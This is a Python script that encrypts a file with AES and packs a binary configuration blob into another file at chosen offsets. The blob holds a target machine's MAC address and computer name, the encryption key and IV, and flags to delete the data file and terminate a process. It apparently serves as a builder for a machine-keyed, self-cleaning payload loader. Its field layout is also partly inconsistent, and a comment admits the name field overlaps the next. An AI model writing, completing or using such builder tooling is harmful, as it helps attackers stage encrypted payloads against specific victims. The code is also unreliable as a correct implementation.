import struct
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

class FilePatcher:
    def __init__(self, input_file):
        with open(input_file, "rb") as f:
            self.content = bytearray(f.read())

    def patch(self, offset, data):
        end = offset + len(data)
        if end > len(self.content):
            raise ValueError("Patch exceeds file size")
        self.content[offset:end] = data

    def save(self, output_file):
        with open(output_file, "wb") as f:
            f.write(self.content)

def pad_utf16le(text, wchar_count):
    raw = text.encode("utf-16le")
    return raw.ljust(wchar_count * 2, b"\x00")

def encrypt_file(input_path, output_path, key, iv):
    with open(input_path, "rb") as f:
        data = f.read()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data, 16))
    with open(output_path, "wb") as f:
        f.write(encrypted)
    return encrypted

def build_blob(arg, mac, comp_name, enc_path, in_path, key, iv, del_dat, term_proc):
    buf = bytearray(436)
    enc_data = encrypt_file(in_path, enc_path, key, iv)

    # arg|30] at offset 0
    buf[0:30] = arg.ljust(30, b"\x00")
    
    # arghash[16] at offset 30
    buf[30:46] = hashlib.md5(buf[0:30]).digest()
    
    # targetMac[6] at offset 46
    buf[46:52] = mac
    
    # WCHAR Target Computer Name [64] at offset 52
    buf[52:116] = pad_utf16le(comp_name, 32)
    
    # wChar Encrypted file path[260] at offset 116
    # Note: This overlaps with Computer Name if 52 + 128 (180). 
    # Using your exact requested start offset:
    buf[116:376] = pad_utf16le(enc_path, 130) 

    # Encrypted File size [4] at offset 376
    struct.pack_into("<I", buf, 376, len(enc_data))
    
    # AES key [16] at offset 380
    buf[380:396] = key
    
    # IV [16] at offset 396
    buf[396:412] = iv
    
    # md5 Hash dat file [16] at offset 412
    buf[412:428] = hashlib.md5(enc_data).digest()
    
    # delete dat file [4] at offset 428
    struct.pack_into("<I", buf, 428, int(del_dat))
    
    # Terminate process [4] at offset 432
    struct.pack_into("<I", buf, 432, int(term_proc))

    return bytes(buf)

def main():
    arg = input("Arg string: ").encode()
    mac = bytes.fromhex(input("MAC (hex): "))
    comp_name = input("Computer Name: ")
    in_path = input("Input File: ")
    enc_path = input("Encrypted File Path: ")
    key = bytes.fromhex(input("AES Key (16 bytes): "))
    iv = bytes.fromhex(input("IV (16 bytes): "))
    del_dat = input("Delete file? (y/n): ").lower() == 'y'
    term_proc = input("Terminate? (y/n): ").lower() == 'y'

    blob = build_blob(arg, mac, comp_name, enc_path, in_path, key, iv, del_dat, term_proc)

    print(blob)
    
    with open(input("Blob Output Filename: "), "wb") as f:
        f.write(blob)

    if input("Patch a file? (y/n): ").lower() == 'y':
        patcher = FilePatcher(input("Target File: "))
        while True:
            off = input("Offset (Integer, enter to stop): ")
            if not off: break
            patcher.patch(int(off), bytes.fromhex(input("Hex data: ")))
        patcher.save(input("Patched Output Name: "))

if __name__ == "__main__":
    main()